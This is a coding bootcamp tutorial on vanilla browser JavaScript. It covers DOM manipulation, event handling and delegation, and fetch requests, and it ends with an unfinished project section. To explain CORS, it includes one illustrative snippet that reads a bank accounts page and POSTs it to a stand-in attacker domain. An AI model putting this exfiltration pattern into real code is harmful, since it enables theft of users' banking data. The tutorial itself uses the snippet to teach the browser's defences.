# Vanilla JavaScript Projects :coffee:

## Introduction
During the first four weeks of the bootcamp, we learned how to code with JavaScript using the NodeJS platform. But as you probably know, [JavaScript's beginnings were in the browser, in 1995](https://en.wikipedia.org/wiki/JavaScript#Beginnings_at_Netscape). At that time, personal computers were starting to become more powerful and there was a realization that **the web needed to become more dynamic**.

Before that time, web browsers were quite dumber than they are now. A browser would receive an HTML page from a web server -- either dynamically created or as a static file -- and [render the page](http://www.pathinteractive.com/blog/design-development/rendering-a-webpage-with-google-webmaster-tools/), making additional requests for every `<img>` element therein. After rendering a page, the possible interactions were limited:

* The user clicks on an `A` (anchor) element on the page, making the browser issue a **`GET`** request to the URL specified in the `href` attribute of the anchor, effectively loading another page
* The user fills out a `<form>` and submits it, making the browser issue either a **`GET`** or **`POST`** request -- depending on the `method` attribute of the `<form>` -- to the URL specified in the `action` attribute of the form. This would also result in another page load.

*(This method of creating web sites and rendering them is exactly how you built your [Reddit Clone Project](https://github.com/DecodeMTL/node-express-reddit-clone), using NodeJS, Express and Pug on the server side. In this model, the browser did very little.)*

This was fine for a while but with the advent of JavaScript in browsers in 1995, things would dramatically change. Browser JavaScript is the same language you learned while studying NodeJS, but it offers dynamic functionality that is meant for the browser.

While NodeJS gives you modules to [access the computer's file system](https://nodejs.org/api/fs.html), [create HTTP servers](https://nodejs.org/api/http.html), [lower level socket servers](https://nodejs.org/api/net.html), and a [huge library of modules](http://npmjs.com/) to [connect to databases](https://www.npmjs.com/package/mysql), [read the keyboard](https://www.npmjs.com/package/prompt) and even [control robots](https://www.npmjs.com/package/johnny-five), browser JavaScript gives you:

* **[The DOM](http://htmldog.com/guides/javascript/intermediate/thedom/)**: the DOM -- Document Object Model -- is accessible using the globally predefined `document` variable. It is a representation of the HTML document that your browser has rendered as a **tree of JavaScript objects**. With the DOM, you can change any part of an already rendered web page by writing code inside a `<script>` tag using the JavaScript language you already know.
* **[Events and Callbacks](http://htmldog.com/guides/javascript/intermediate/events/)**: through the DOM, you can make a page dynamic by *listening* to various events. You can execute callback functions on page load, page scroll, mouse move, mouse click, keyboard input and many more.
* **[AJAX](http://htmldog.com/guides/javascript/intermediate/ajax/)**: AJAX -- Asynchronous JavaScript And XML -- has become a buzzword over the years. It refers to a functionality that allows you to *dynamically make HTTP requests using JavaScript code* in a `<script>` tag, *without reloading the page*.

Throughout the years, various APIs were added to browser JavaScript allowing us to do things like [drawing on a web page](http://htmldog.com/guides/javascript/advanced/canvas/), [store user information in the browser](http://htmldog.com/guides/javascript/advanced/localstorage/), and [manipulate the browser history](https://developer.mozilla.org/en-US/docs/Web/API/History_API) to name a few. Together, this set of functionalities allows us to build things like Gmail, Netflix, Google Maps and pretty much any application we can imagine, all running inside a web browser. It is this set of functionalities that allows Facebook and Twitter to show you notifications without having to refresh the page. Same thing for upvoting things on Reddit while staying in place.

They are collectively referred to as ["Vanilla JS"](http://vanilla-js.com/), in contrast with the [many](https://angularjs.org/) [frameworks](http://emberjs.com/) and [libraries](https://jquery.com/) that are built on top of them. In this course, we will be looking at two libraries built on top of browser JavaScript:

* **[jQuery](https://jquery.com/)**: jQuery was created as a response to a huge problem at the time, namely the discrepancy between JavaScript implementations in browsers. It provided a unified API to access the DOM, events, AJAX and more without having to worry about browser differences.
* **[React](https://facebook.github.io/react/)**: React is a user interface library that was created as a response to the difficulty of managing big browser-based applications using the primitive Vanilla JS functions. It turns out that manipulating the DOM directly using the `document` object is error prone at scale, and becomes quickly unmanageable. React tries to solve this problem in a *declarative manner*, "similar to SQL". Rather than calling DOM functions to manipulate the content of a page, React allows us to define user interface components in a declarative way, and automatically takes care of calling the appropriate DOM functions. The similarity to SQL lies in the fact that we never have to tell an SQL database *how* we want things to be computed, but simply what to compute. Think of it as the difference between `ORDER BY createdAt DESC` and `data.sort(function(a, b) {...})`.

---

## Projects
Before learning any of these libraries, we will work on getting familiar with Vanilla JavaScript. Since everything is built on top of it, it will pay off to know how it works. In order to do this, we will be building three front-end projects that run completely in the browser. In these projects, our web server's only role will be to produce a static `index.html` file that contains a `<script>` tag *where everything will happen*. One implication of this is that search engine crawlers like Google Bot will not be able to view the content of our applications, since *everything will happen after the page has loaded*, long after the HTTP request/response cycle has ended.

### Weather application
We will start by building a first project **together**. It will be a simple weather application that asks the user for their city, and dynamically displays a weather box with the current temperature, basic weather conditions as well as an icon representing the current state of things.

### Flickr browser
Even though Flickr already has an excellent web app to browse photos, we will use the Flickr API to create an infinitely scrolling browser based on a search word.

### Custom Reddit browser
In week two, you built a [command-line Reddit browser](https://github.com/DecodeMTL/reddit-cli-project) using the Reddit JSON API. Here we will use the same API through AJAX and the DOM in order to create a simple but custom browser-based reddit app.

---

## Baby steps
Before starting to work on the projects, we'll have to learn about the building blocks of browser-based JavaScript.

To follow along, create a file called `index.html` with the following structure:

```html
<!doctype html>
<html>
  <head></head>
  <body>
    <div id="app"></div>
    <script src="app.js"></script>
  </body>
</html>
```

Then, create an empty `app.js` file in which you'll be able to test the functions you will learn about. The browser will load `app.js` as soon as it encounters the `<script>` tag, and will execute the contained JavaScript in the context of the current page.

### Creating and manipulating elements
The DOM API can be accessed through the `document` global variable. This variable is made available to you in JavaScript running in the context of the current page, and it represents the currently displayed document.

Let's start from the JavaScript console. Open your developer tools, move to the Console tab and write the following:

```javascript
document.getElementById('app')
```

You'll get something like this:

![getElementById](document-getelementbyid.png)

This is the DOM in action. We queried the document for an element by its ID, and since we have a `<div id="app">` in our page, we got that back as a return value.

Now try this:

```javascript
document.getElementsByTagName('body')
```

This time notice you get something that looks like an array. Expand it and hover over the first element. You'll see it light up on the page.

Modern browsers have a way to query for elements using a CSS Selector. Try this:

```javascript
document.querySelector('#app')
```

You'll get back exactly the same element.

Let's move to our `app.js` and write the following:

```javascript
var app = document.querySelector('#app');

var theTitle = document.createElement('h1');
theTitle.innerText = "Hello World!";
```

Then, refresh the page. Hmm it looks like something is missing... When we create a new element using the DOM, we have to add it to an already existing element, or else it won't appear on the page. Add the following line to complete this:

```javascript
app.appendChild(theTitle);
```

Refresh the page one more time to see your dynamically created `<h1>` appear on the page.

Another way to accomplish the same thing is using the `innerHTML` property of an element:

```javascript
var app = document.querySelector('#app');
app.innerHTML = '<h1>Hello World!</h1>';
```

In this case the browser will parse the HTML string and create the elements on the fly. The flipside is that it will remove anything that was previously in #app, so it's not as useful as `appendChild`.

Now, modify your `index.html` to add a `<link>` to a `style.css` file. In `style.css`, write the following:

```css
.red {
  color: red;
}
```

This says that any element with the class "red" will have its text color in red. Then, open your Console and write the following:

```javascript
var h1 = document.querySelector('h1'); // there's only one right now
h1.classList.add('red');
```

As you do this, watch the text of the h1 change from its black default to red.

Sometimes, we need to manipulate the styling of an element without adding/removing a class name. We can do this using the inline `style` attribute of the element. Instead of taking a string, it's an object with one property for each style. Try the following in the console after refreshing the page:

```javascript
document.querySelector('h1').style.color = 'red';
```

It will have the same effect. It turns out that often, manipulating the classes of an element is cleaner than changing its inline style because it's easier to remove the class by using `classList.remove()`.

### Handling events
Handling events is done by calling the `addEventListener` method of a DOM element. Many types of events exist. As an example there are mouse events, form events, keyboard events.

Let's add a button to our page and do something when it is clicked. Change the code of `app.js` to the following:

```javascript
var app = document.querySelector('#app');

// Add a title
var theTitle = document.createElement('h1');
theTitle.innerText = "Hello World!";
app.appendChild(theTitle);

// Add a button
var theButton = document.createElement('button');
theButton.innerText = "click me!";
app.appendChild(theButton);

// Here's the new part!
theButton.addEventListener('click', function() {
  theTitle.classList.add("red");
});
```

Then, reload the page and try clicking on the button. Notice the title text change to red. Change the `classList.add` to `classList.toggle` and try clicking the button many times.

Move to your HTML file and put the following inside the `#app` div:

```html
<input type="text" id="textBox">
<button>click me</button>
```

Then, change the whole code of `app.js` to the following:

```javascript
var textBox = document.querySelector('#textBox');
var theButton = document.querySelector('#app button'); // CSS for "the element with tag name button inside the element with id app". We could also have given the button an ID

textBox.addEventListener('input', function() {
  console.log(this.value);
});

theButton.addEventListener('click', function() {
  alert('The value of the input box is: ' + textBox.value);
});
```

Then, reload the page, and go to the Console tab of your developer tools (they *are* open, right?). Type some text in the input box, and see the `console.log`s coming up. At any point click on the button to get an alert.

Notice the use of `this` inside the callback to the input event listener. When an event handler is called, `this` will always refer to the element on which `addEventListener` was called. This allows us to re-use the same event handler for many elements.

#### Stopping to listen to an event
If we want to stop listening to an event on an element, we have to call the `removeEventListener` method on that element. But to do this, we need to have a *reference* to the function that was passed to `addEventListener`. If we used an inline function expression, then we can't do that. Let's try with the following code:

```javascript
var textBox = document.querySelector('#textBox');
var theButton = document.querySelector('#app button'); // CSS for "the element with tag name button inside the element with id app". We could also have given the button an ID

function printValue() {
  console.log(this.value);
}

textBox.addEventListener('input', printValue);

theButton.addEventListener('click', function() {
  // When the button is clicked, stop listening to input events on the input box
  textBox.removeEventListener('input', printValue);
});
```

Try running this code in the browser, and after pressing the button the event listening should stop.

#### Default event behaviors
Some events have a default behavior attached to them. For example when you click on an `A` element, the browser will load its `href` property, effectively leaving the current page. This default behavior can be prevented by accessing the event object and calling its `preventDefault` method. When an event handler gets called, it receives the event object as its first argument. Let's see how that works...

Clear the content of the #app div in your HTML, and change `app.js` to the following code:

```javascript
var app = document.querySelector('#app');

var theLink = document.createElement('a');
theLink.innerText = 'a link to DecodeMTL';
theLink.setAttribute('href', 'http://www.decodemtl.com'); // This is how we set HTML attributes ;)
app.appendChild(theLink);

theLink.addEventListener('click', function(event) {
  event.preventDefault();
  console.log('Prevented browsing to ' + this.href + ' by using preventDefault');
});
```

Try refreshing the page and clicking on the link and nothing should happen.

#### Event bubbling
The DOM tree is a nested structure. If you click on a nested element, it seems logical that you also clicked on its parent, and that parent's parent and so on. Let's visualize this behavior with an example...

Change the content of the #app div to the following:

```html
<p id="theParagraph">
  This is a <a id="theLink" href="http://www.decodemtl.com">link</a>!
</p>
```

Then change `app.js` to the following code:

```javascript
// This gives some height to the #app div so we can click it
document.querySelector('#app').style.height = '400px';

// This makes the #app div visible. Note that the CSS background-color is written backgroundColor in the DOM ;)
document.querySelector('#app').style.backgroundColor = '#ccc';

document.body.addEventListener('click', function() {
  console.log('The body was clicked!');
})
document.querySelector('#app').addEventListener('click', function() {
  console.log('#app was clicked!');
});

document.querySelector('#theParagraph').addEventListener('click', function() {
  console.log('#theParagraph was clicked!');
});

document.querySelector('#theLink').addEventListener('click', function(event) {
  event.preventDefault(); // We need to do this otherwise we will leave the page if we click the link...
  console.log('#theLink was clicked!');
});
```

Then, refresh the page in your browser and try clicking in different places. Click on the link, then on the text inside the paragraph, and then anywhere else on the page.

With one click, up to four event handlers are getting called starting from the element that was clicked and bubbling up to the body. At any point in time, we can call the event object's `stopPropagation` method to stop this bubbling. Try adding `event.stopPropagation()` in the different event handlers, and observe the result in your browser.

#### Event delegation :warning:
This topic is extremely important and you should understand it well before moving on. Let's look at an example by writing the following code inside the #app div of our HTML:

```html
<h1>Event delegation</h1>
<ul id="theList">
  <li>First list item</li>
  <li>Second list item</li>
  <li>Third list item</li>
  <li>Fourth list item</li>
  <li>Fifth list item</li>
</ul>
```

Then, let's try to attach an event handler to each list item, and print its inner text when it is clicked:

```javascript
var listItems = document.querySelectorAll('#theList li'); // Select all the LIs inside #theList

// It turns out that querySelectorAll does NOT return an array, but an array-like object called a NodeList
// Here's one way we can iterate over the NodeList items, using the Array prototype
Array.prototype.forEach.call(listItems, function(listItem) {
  // Add one event listener per list item
  listItem.addEventListener('click', function() {
    console.log('You clicked on: ' + this.innerText);
  });
});
```

Try running your code in the browser to show yourself that it works. Even though this code works, there are mainly two things that are wrong with it:

1. If we dynamically add new LIs to the UL after setting up the event listeners, clicking them will do nothing -- ask yourself why
2. Setting up multiple event handlers can be extremely resource intensive, and we can do much better! Imagine an image gallery with 100s of images... One event handler per image will simply not cut it.

It's not by accident that we looked at event propagation in the last section. Using the propagation, we can solve these two issues in one shot. First off though, write the following code in your developer tools Console:

```javascript
var theList = document.querySelector('#theList');

var newItem = document.createElement('li');
newItem.innerText = 'Sixth list item';
theList.appendChild(newItem);
```

Then try clicking on the sixth LI that was added dynamically and prove to yourself that nothing happens. Now let's fix it!

Change the code of `app.js` to the following:

```javascript
var theList = document.querySelector('#theList');

theList.addEventListener('click', function(event) {
  // While `this` represents the #theList element, event has a property called `target` which represents the actual originator of the event. We can use this to our advantage!

  // First, check if the target is an LI that is a direct child of the list:
  if (event.target.parentNode === theList) {
    // We definitely clicked on an LI
    console.log('You clicked on: ' + event.target.innerText);
  }
});
```

With this code in place, we should get the same initial behavior as the previous code. One advantage is that we only have a single event handler, no matter how many LIs. Now try running the following code in your console:

```javascript
var theList = document.querySelector('#theList');

var newItem = document.createElement('li');
newItem.innerText = 'Sixth list item';
theList.appendChild(newItem);
```

Then try clicking on the sixth LI and notice the difference. It gets console.logged! This is event delegation in a nutshell, and you should use it wherever you can. This is also a great transition for the next section where we will learn about AJAX. Making HTTP requests in the context of a web page will often result in adding new elements dynamically. Setting up event delegation will enable us to listen to clicks on those new elements without having to manually attach event handlers to each one of them :)

### Making HTTP requests
Browser JavaScript would be pretty boring if all you could do was manipulate the page. What makes things really interesting is the ability to make HTTP requests in the context of an already loaded web page. This enables us to load external information, then use what we already learned to make that information appear on the page.

Originally, this was accomplished with a contraption called `XMLHttpRequest` and the API for it was less than stellar. Modern browsers offer a much better alternative using the globally available `fetch` function. As a bonus, `fetch` uses Promises to give back its results, allowing us to write much nicer code.

The process of fetching external information and updating the page as a result is often called AJAX, which stands for "Asynchronous JavaScript And XML". After four weeks of bootcamping, we now understand what asynchronous means. We also know what JavaScript means. We haven't really looked at XML. It turns out to be quite a heavy data format, both in terms of its size and its parsing. Many new APIs prefer to use the JSON format instead. Since JSON is native to JavaScript, this is great for us!

Let's look at how we can use `fetch`, at first only to make an HTTP request, and then eventually to build something with it. Let's start by changing the code of `app.js` to the following:

```javascript
fetch('http://www.rbcroyalbank.com')
.then(function(response) {
  return response.text(); // Parsing the response as text returns another Promise so we chain it
})
.then(function(textResponse) {
  console.log(textResponse);
});
```

Try refreshing the browser and look at your Console tab.

![CORS error](cors-error.png)

What's that? An error! What the browser is telling us here is that we're not allowed to see the response from the Royal Bank site. Since this request is running in the context of our web browser, this makes a LOT of sense. Because such a request would have access to our cookies, seeing the response could allow us to retrieve some sensitive information from anyone who loads up our web page in *their* browser.

Imagine that we were allowed to see the content of this 3rd party site. Here's a hand-waving example of what we could do:

```javascript
fetch('https://www.onlinebank.com/accounts')
.then(function(response) {
  return response.text();
})
.then(function(textResponse) {
  // We now have an HTML page with the user's bank accounts! Let's send it to ourselves!!
  fetch('http://www.evil-domain.com/bank-accounts', {
    method: 'POST',
    body: textResponse
  });
});
```

Having setup such a page, we can then send the link to unsuspecting people and harvest all their banking information. Browsers prevent this behavior by default, and only allow us to look at the response of `fetch` requests when they are made to our own domain name, called the Origin.

A system called CORS -- Cross-Origin Resource Sharing -- allows web servers to cooperate with web application builders. By setting appropriate headers in the HTTP response, a web server can tell the browser that the response can be allowed to be seen by the originator of the AJAX request. Your online bank would *never* do such a thing, but a lot of APIs offering publicly available information will enable CORS on some of their endpoints.

One example of such an API is the Reddit JSON API. This is probably the last time we will look at Reddit in this bootcamp, because quite frankly we're starting to be fed up with it ;) Let's look at an example of making an AJAX call to the Reddit JSON API, parsing the result and doing something with it:

```javascript
fetch('https://www.reddit.com/r/montreal.json')
.then(function(response) {
  return response.json(); // Parsing as JSON returns a Promise, let's chain it
})
.then(function(jsonResponse) {
  var posts = jsonResponse.data.children;

  posts.forEach(function(post, i) {
    console.log('Post #' + (i+1) + ': ' + post.data.title);
  });
});
```

Here we are retrieving the front page of r/Montreal and prining each title on the Console. Try it for yourself. From then on, the possibilities are endless. Rather than printing the result in the console, we can construct some DOM elements and display them on the page. Let's try to do that! Write the following code in `app.js`:

```javascript
fetch('https://www.reddit.com/r/montreal.json')
.then(function(response) {
  return response.json(); // Parsing as JSON returns a Promise, let's chain it
})
.then(function(jsonResponse) {
  jsonResponse.data.children
  .map(function(post) {
    post = post.data; // Reddit has a weird format ;)

    // Create a box for each post
    var linkBox = document.createElement('p');

    // Create a link element for each post
    var link = document.createElement('a');
    link.setAttribute('href', post.url);
    link.setAttribute('target', '_blank'); // Make the link open in a new tab
    link.innerText = post.title;

    // Add the link to the paragraph
    linkBox.appendChild(link);

    // Return the paragraph from the map callback
    return linkBox;
  })
  .forEach(function(linkParagraph) {
    document.body.appendChild(linkParagraph);
  });
});
```

Try it again by refreshing the browser. As you can imagine, this AJAX code could be executed as a result of an event, a timer or anything else that you can implement using JavaScript.

### "Conclusion"
By marrying events, AJAX calls and DOM manipulation we can build fully functioning web applications that run in the browser. We'll do that in the next section by building three small web applications. One of the things that we'll see while doing this is that directly using the DOM can be quite cumbersome, and managing the state of our application can quickly get out of hand. Next week, we'll start looking at how to solve some of these problems in a declarative way using the [React UI library built by Facebook](https://facebook.github.io/react/).

---

## Project #1: Weather App
TODO
